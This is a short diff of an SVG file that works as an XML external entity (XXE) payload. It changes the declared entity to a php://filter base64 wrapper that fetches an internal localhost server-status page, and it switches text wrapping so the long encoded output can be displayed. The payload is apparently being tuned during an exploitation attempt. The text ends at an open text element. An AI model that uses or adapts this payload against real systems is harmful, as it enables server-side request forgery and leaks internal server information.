@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "http://localhost/server-status">
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/server-status">
 ]>
 <svg width="1200" height="800" xmlns="http://www.w3.org/2000/svg">
   <style>
     text {
       font-family: monospace;
       font-size: 12px;
-      white-space: pre; /* This is important to preserve formatting */
+      white-space: pre-wrap; /* Use pre-wrap to handle the long string */
     }
   </style>
   <text x="10" y="20">
